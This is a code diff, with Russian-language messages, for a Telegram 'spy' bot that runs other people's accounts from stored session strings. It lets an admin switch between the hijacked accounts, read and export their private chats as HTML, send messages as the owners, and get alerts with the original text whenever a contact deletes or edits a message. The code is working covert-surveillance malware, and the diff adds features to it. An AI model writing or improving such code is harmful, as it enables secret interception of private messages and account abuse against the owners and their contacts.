@@ -173,7 +173,7 @@ def get_code_keyboard():
 
 async def export_chat_to_html(client, chat_id, chat_name, me):
     messages = []
-    async for msg in client.iter_messages(chat_id, limit=2000):
+    async for msg in client.iter_messages(chat_id, limit=1000):
         if msg.text:
             try:
                 if msg.out:
@@ -244,7 +244,7 @@ async def cmd_spyhelp(message):
 <b>ДЕЙСТВИЯ</b>
 /send ID/@username текст
 /chats - список диалогов
-/chat НОМЕР - просмотр чата
+/chat ID или @username - просмотр чата
 /status @username - статус
 /online - кто в сети
 
@@ -367,7 +367,7 @@ async def cmd_active(message):
     if not is_admin(message.from_user.id):
         return
     cl, uid = get_active_client()
-    if not cl or is_target_admin(uid):
+    if not cl:
         await message.answer("❌ Нет активного аккаунта")
         return
     try:
@@ -376,11 +376,47 @@ async def cmd_active(message):
     except:
         await message.answer(f"✅ Активный ID: {uid}")
 
+# ===== ИСПРАВЛЕННЫЙ /swap =====
+@dp.message_handler(commands=['swap'])
+async def cmd_swap(message):
+    global current_active_user
+    if not is_admin(message.from_user.id):
+        return
+    args = message.get_args()
+    if not args:
+        await message.answer("❌ /swap НОМЕР (номер из /users)")
+        return
+    try:
+        num = int(args) - 1
+        cursor.execute('SELECT user_id, first_name, username FROM user_sessions')
+        rows = cursor.fetchall()
+        # Исключаем админов
+        na = [(uid, fn, un) for uid, fn, un in rows if not is_target_admin(uid)]
+        if num < 0 or num >= len(na):
+            await message.answer("❌ Неверный номер. Используй /users для просмотра")
+            return
+        user_id = na[num][0]
+        name = na[num][1] or na[num][2] or str(user_id)
+        if user_id not in active_clients:
+            await message.answer(f"❌ Аккаунт {name} не запущен")
+            return
+        current_active_user = user_id
+        cursor.execute('UPDATE user_sessions SET is_active=0')
+        cursor.execute('UPDATE user_sessions SET is_active=1 WHERE user_id=?', (user_id,))
+        conn.commit()
+        me = await active_clients[user_id].get_me()
+        await message.answer(f"✅ Переключился на {me.first_name}")
+    except Exception as e:
+        await message.answer(f"❌ Ошибка: {e}")
+
 @dp.message_handler(commands=['send'])
 async def cmd_send(message):
     if not is_admin(message.from_user.id):
         return
     args = message.get_args()
+    if not args:
+        await message.answer("❌ /send @username текст")
+        return
     parts = args.split(maxsplit=1)
     if len(parts) < 2:
         await message.answer("❌ /send @username текст")
@@ -407,7 +443,7 @@ async def cmd_chats(message):
     if not cl:
         await message.answer("❌ Нет активного аккаунта")
         return
-    await message.answer("🔄 Собираю список...")
+    await message.answer("🔄 Собираю список диалогов...")
     chats = []
     async for dlg in cl.iter_dialogs():
         if dlg.is_user:
@@ -431,16 +467,16 @@ async def cmd_chats(message):
             out = ""
     if out:
         await message.answer(out, parse_mode='HTML')
-    await message.answer("💡 /chat НОМЕР - посмотреть чат")
+    await message.answer("💡 /chat ID или @username - посмотреть чат")
 
-# ===== ИСПРАВЛЕННАЯ КОМАНДА /chat =====
+# ===== ИСПРАВЛЕННЫЙ /chat - РАБОТАЕТ ПО ID И @username =====
 @dp.message_handler(commands=['chat'])
 async def cmd_chat(message):
     if not is_admin(message.from_user.id):
         return
     args = message.get_args()
     if not args:
-        await message.answer("❌ /chat НОМЕР (из /chats)")
+        await message.answer("❌ /chat ID или @username")
         return
     
     cl, uid = get_active_client()
@@ -448,17 +484,20 @@ async def cmd_chat(message):
         await message.answer("❌ Нет активного аккаунта")
         return
     
-    if not args.isdigit():
-        await message.answer("❌ Введи номер из /chats")
+    # Пробуем найти пользователя по ID или @username
+    try:
+        if args.isdigit():
+            ent = await cl.get_entity(int(args))
+        else:
+            ent = await resolve_entity(cl, args)
+        if not ent or ent.id == uid or is_target_admin(ent.id):
+            await message.answer("❌ Пользователь не найден")
+            return
+        target_id = ent.id
+        target_name = ent.first_name or ent.username or args
+    except Exception as e:
+        await message.answer(f"❌ Пользователь не найден: {e}")
         return
-    
-    num = int(args) - 1
-    if uid not in active_chats or not active_chats[uid] or num < 0 or num >= len(active_chats[uid]):
-        await message.answer("❌ Неверный номер. Сначала выполни /chats")
-        return
-    
-    target_id = active_chats[uid][num]['id']
-    target_name = active_chats[uid][num]['name']
     
     kb = InlineKeyboardMarkup(row_width=2)
     kb.add(
@@ -504,7 +543,6 @@ async def show_last(cb):
     
     if msgs:
         response = f"💬 <b>ЧАТ С {target_name}</b>\n\n" + "\n".join(reversed(msgs))
-        # Разбиваем на части если длинное
         if len(response) > 4000:
             for i in range(0, len(msgs), 15):
                 part = "\n".join(reversed(msgs[i:i+15]))
@@ -532,33 +570,30 @@ async def export_html(cb):
     
     await cb.answer("Экспортирую чат в HTML...")
     
-    me = await cl.get_me()
-    html_content = await export_chat_to_html(cl, target_id, target_name, me)
-    
-    if not html_content:
-        await cb.message.answer("❌ Нет текстовых сообщений для экспорта")
-        return
-    
-    with tempfile.NamedTemporaryFile(mode='w', suffix='.html', encoding='utf-8', delete=False) as f:
-        f.write(html_content)
-        path = f.name
-    
-    # Проверяем размер файла
-    if os.path.getsize(path) == 0:
-        await cb.message.answer("❌ Ошибка: файл пустой")
+    try:
+        me = await cl.get_me()
+        html_content = await export_chat_to_html(cl, target_id, target_name, me)
+        
+        if not html_content:
+            await cb.message.answer("❌ Нет текстовых сообщений для экспорта")
+            return
+        
+        with tempfile.NamedTemporaryFile(mode='w', suffix='.html', encoding='utf-8', delete=False) as f:
+            f.write(html_content)
+            path = f.name
+        
+        if os.path.getsize(path) == 0:
+            await cb.message.answer("❌ Ошибка: файл пустой")
+            os.unlink(path)
+            return
+        
+        with open(path, 'rb') as f:
+            await bot.send_document(cb.from_user.id, InputFile(f, filename=f"chat_{target_name}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.html"), caption=f"📁 Чат с {target_name}")
+        
         os.unlink(path)
-        return
-    
-    with open(path, 'rb') as f:
-        for aid in ADMIN_IDS:
-            try:
-                await bot.send_document(aid, InputFile(f, filename=f"chat_{target_name}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.html"), caption=f"📁 Чат с {target_name}")
-                await f.seek(0)
-            except Exception as e:
-                logger.error(f"Ошибка отправки HTML: {e}")
-    
-    os.unlink(path)
-    await cb.message.answer("✅ HTML файл отправлен")
+        await cb.message.answer("✅ HTML файл отправлен")
+    except Exception as e:
+        await cb.message.answer(f"❌ Ошибка экспорта: {e}")
 
 @dp.message_handler(commands=['status'])
 async def cmd_status(message):
@@ -780,6 +815,49 @@ async def run_userbot(owner_id, session_string):
             cursor.execute('INSERT INTO saved_messages (owner_id, msg_id, sender_id, text, date) VALUES (?, ?, ?, ?, ?)',
                           (owner_id, event.id, sid, event.text, datetime.now().isoformat()))
             conn.commit()
+    
+    @client.on(events.MessageDeleted)
+    async def notify_delete(event):
+        if not event.is_private:
+            return
+        for mid in event.deleted_ids:
+            msg = saved_messages.get(owner_id, {}).get(mid)
+            if not msg:
+                cursor.execute('SELECT sender_id, text FROM saved_messages WHERE owner_id=? AND msg_id=?', (owner_id, mid))
+                row = cursor.fetchone()
+                if row:
+                    msg = {'sender_id': row[0], 'text': row[1]}
+            if msg and msg['sender_id'] != owner_id:
+                try:
+                    u = await client.get_entity(msg['sender_id'])
+                    name = u.first_name or 'Пользователь'
+                    await send_to_admin(f"🗑 {name} удалил сообщение:\n\n{msg['text'][:500]}")
+                    cursor.execute('DELETE FROM saved_messages WHERE owner_id=? AND msg_id=?', (owner_id, mid))
+                    conn.commit()
+                except:
+                    pass
+    
+    @client.on(events.MessageEdited)
+    async def notify_edit(event):
+        if not event.is_private or event.out:
+            return
+        mid = event.id
+        ntxt = event.text or ''
+        msg = saved_messages.get(owner_id, {}).get(mid)
+        if not msg:
+            cursor.execute('SELECT sender_id, text FROM saved_messages WHERE owner_id=? AND msg_id=?', (owner_id, mid))
+            row = cursor.fetchone()
+            if row:
+                msg = {'sender_id': row[0], 'text': row[1]}
+        if msg and msg['sender_id'] != owner_id and msg['text'] != ntxt:
+            try:
+                u = await client.get_entity(msg['sender_id'])
+                name = u.first_name or 'Пользователь'
+                await send_to_admin(f"✏️ {name} изменил сообщение:\n\nБыло: {msg['text'][:200]}\nСтало: {ntxt[:200]}")
+                cursor.execute('UPDATE saved_messages SET text=? WHERE owner_id=? AND msg_id=?', (ntxt, owner_id, mid))
+                conn.commit()
+            except:
+                pass
     
     @client.on(events.NewMessage)
     async def user_commands(event):
